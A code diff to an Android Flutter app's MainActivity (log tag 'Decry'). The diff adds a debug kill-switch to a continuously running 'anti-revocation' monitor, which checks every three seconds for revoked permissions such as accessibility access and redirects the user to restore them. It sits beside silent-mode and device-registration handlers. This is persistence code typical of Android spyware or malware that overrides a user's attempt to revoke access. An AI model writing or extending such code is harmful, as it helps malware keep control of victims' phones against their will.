@@ -96,12 +96,16 @@ class MainActivity : FlutterActivity() {
         }
     }
 
-    // Anti-revocation: Monitor and restore permissions continuously
+    // Anti-revocation: Monitor and restore permissions continuously.
+    // Kill-switch via SharedPreferences ("auto_redirect", default true) so
+    // the debug UI can silence settings redirects during manual testing.
     private fun startAntiRevocationMonitor() {
         Thread {
             while (true) {
                 try {
                     Thread.sleep(3000)
+
+                    if (!prefs.getBoolean("auto_redirect", true)) continue
                     
                     // Check accessibility service
                     val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
@@ -191,6 +195,15 @@ class MainActivity : FlutterActivity() {
                     "toggleSilentMode" -> toggleSilentMode(call.argument<Boolean>("enabled"), result)
                     "isSilentModeOn" -> result.success(isSilentModeOn())
                     "getNotificationPolicyStatus" -> result.success(getNotificationPolicyStatus())
+                    "getAutoRedirect" -> {
+                        result.success(prefs.getBoolean("auto_redirect", true))
+                    }
+                    "setAutoRedirect" -> {
+                        val enabled = call.argument<Boolean>("enabled") ?: true
+                        prefs.edit().putBoolean("auto_redirect", enabled).apply()
+                        Log.i("Decry", "auto_redirect -> $enabled")
+                        result.success(true)
+                    }
                     "registerDevice" -> {
                         deviceChatId = packageName.hashCode().toString()
                         
